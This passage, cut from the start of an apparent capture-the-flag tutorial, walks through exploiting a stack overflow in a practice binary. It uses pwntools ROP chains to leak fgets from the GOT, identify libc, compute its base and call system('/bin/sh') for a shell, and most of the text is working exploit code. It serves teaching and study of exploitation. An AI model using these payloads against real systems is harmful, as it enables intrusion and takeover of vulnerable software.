		print r.recvline().rstrip()
		pop_rdi = p64(0x00000000004006d3)
        GOT_func = elf.got['fgets'] # This can be any function like printf , puts , read , fgets ... anything that is available in the binary
        PUT_func = elf.sym['fgets']
        print(elf.got) #you can see all available functions in the binary using this!
        #So we are actually trying to put the fgets address as an output and then compare it with the binary address to find the base address
		main_func = elf.sym['main']
		payload = [
			"A"*72,
			pop_rdi,
			GOT_func,
			PUT_func,
			main_func
		]
		r.sendline("".join(payload))
		leak = u64(r.recvline().rstrip().ljust(8,"\x00"))
		# The address of the fgets will be put as output , 
		print hex(leak)
		r.close()
		open("payload",'wb').write("".join(payload))
~~~
	- Using ROP function in pwntools
~~~python
from pwn import *

elf = ELF("./1",checksec = False)
r = elf.process()
print r.recvline().rstrip()

rop = ROP(elf) # Calling ROP function
context.arch = 'amd64' # If the binary is 64bit , you should always mention the arch to the pwntools so that it works properly
rop.call(elf.sym['puts'],[elf.got['fgets']]) # Dont forget the square brackets for the second argument in rop.call() function.
rop.call(elf.sym['main']) # we are using the main as the end address because we chave to complete the whole process in the 1 session, as the base address randomises every session. so we can trigger the main function start the program again without moving to next session.

payload = [
	"A"*72,
	rop.chain() # Make a rop chain from the given parameters
]

r.sendline("".join(payload))
leak = u64(r.recvline().rstrip().ljust(8,"\x00"))
print hex(leak)
r.close()
open("payload",'wb').write("".join(payload))
~~~
- Now that if we run the python program , we will get an output of the leaked address , but its not on Unicode format like the below image
~~~
ROP me outside, how 'about dah?
�%���
~~~
- That why I have used rstrip to stip the newline space and ljust to adjust the length of the output to 8 (length of 64 bit address in hex is 8 and for 32bit is 4) and unpacked it with u64() function from pwntools
- After getting the leaked address, find another leaked address for another available function , For Eg. In this case we found the address of fgets and we also have to find the address of puts or some other address so that its easy to narrow the search for the libc database
-  Use a libc database to find an appropriate libc for the given binary [Libc Database](https://libc.blukat.me/) using the leaked address(just use the last 3 digits of the leak address , that is more than enough to find the libc)
![970013cc14984e16a91fa7f550dd186c](https://user-images.githubusercontent.com/66721411/113705723-66c3d580-96fb-11eb-8739-cddcd741a0f0.png)

- Both looks the same , but the last one looks assuring.
- After downloading the libc , just subtract the leak with the respective function in libc to obtain the base address (Note:Base Address always ends with triple zeros, irrespective of the architecture)
~~~python
....SNIPPED....
libc = ELF("./libc.6.so") # Name of the libc that was downloaded
libc.address = leak - libc.sym['fgets'] #Here we are using fgets address as the leaked address is fgets , it is only based on your choice and the availibility of the function in the binary
....SNIPPED.... 
~~~
*And i have the base address saved in the variable libc.address becase , pwntools can save the base address if we used the variable libc.address, which will be useful when we are using ROP function from pwntools*

4. Getting the Shell
- Getting shell can also be done in 2 ways , Both Manually and using ROP function from pwntools
	- Manual Method
```python
from pwn import *
libc = ELF("./libc.6.so")
libc_addr = leak - libc.sym['fgets'] # setting the variable of libc_address as the base address, Note: Dont save the variable as libc.address because it interupts the manual method
pop_rdi = p64(0x00000000004006d3)
bin_sh = next(libc.search(b"/bin/sh\x00"))
sys_add = libc.sym['system']
payload = [
	"A"*72,
	pop_rdi,
	p64(bin_sh+libc_addr),
	p64(sys_add+libc_addr),
]
print r.recvline().rstrip()
r.sendline("".join(payload))
r.interactive()
```
	- Using ROP function in Pwntools
```python
from pwn import *
libc = ELF("./libc.6.so",checksec=False)
libc.address = leak - libc.sym['fgets']
#Note: The variable libc.address should always be declared/intialized between calling elf function for libc and calling rop function for libc , change in this order can prevent you from getting a shell
print hex(libc.address)
rop = ROP(libc)
rop.call(libc.sym['system'],[next(libc.search(b"/bin/sh\x00"))])
payload = [
	"A"*72,
	rop.chain()
]
print r.recvline().rstrip()
r.sendline("".join(payload))
r.interactive()
```
		
